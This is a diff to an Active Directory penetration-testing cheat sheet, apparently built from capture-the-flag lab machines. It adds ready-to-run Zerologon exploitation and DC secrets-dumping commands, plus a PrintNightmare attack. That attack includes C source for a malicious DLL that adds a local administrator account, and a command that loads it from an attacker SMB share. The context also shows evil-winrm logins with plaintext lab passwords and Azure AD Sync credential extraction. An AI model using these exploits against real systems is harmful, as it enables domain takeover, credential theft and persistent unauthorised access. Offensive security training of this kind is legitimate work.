@@ -303,13 +303,57 @@ python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 impacket-ticket_converter ticket.kirbi ticket.ccache
 impacket-ticket_converter ticket.ccache ticket.kirbi
 ```
-### Privilege Escalation via azure ad sync
+### Domain Privilege Escalation via azure ad sync
 ```
 Windows: sqlcmd -S MONTEVERDE -Q "use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration"
 
 evil-winrm -i 10.10.10.172 -u mhope -p "4n0therD4y@n0th3r$" -s .
 adconnect.ps1
 Get-ADConnectPassword
+```
+### Domain Priviledge Escalation By Zerologon CVE-2020-1472
+```
+Detect:
+nxc smb ip -u username -p pass -M zerologon
+
+Exploit:
+python3 cve-2020-1472-exploit.py Monteverde(dc-name) 10.10.10.172(dc-ip)
+impacket-secretsdump 'megabank.local'/'Monteverde$'@10.10.10.172 -just-dc -no-pass 
+```
+### Domain Priviledge Escalation By Printnightmare CVE-2021-1675 CVE-2021-34527
+```
+impacket-smbserver test . -smb2support
+
+#include <stdlib.h>
+#include <windows.h> //appened code
+//name:myDLL.cpp
+
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        int i;
+  	    i = system ("net user dave2 password123! /add"); //appened code
+  	    i = system ("net localgroup administrators dave2 /add"); //appened code
+        break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+}
+
+
+ x86_64-w64-mingw32-gcc adduser.cpp --shared -o adduser.dll
+
+python3 printnightmare.py -dll '\\10.21.176.25\test\adduser.dll' 'svc-admin:management2005@10.10.211.60'
 ```
 ### Shadow Credential Attack
 ```
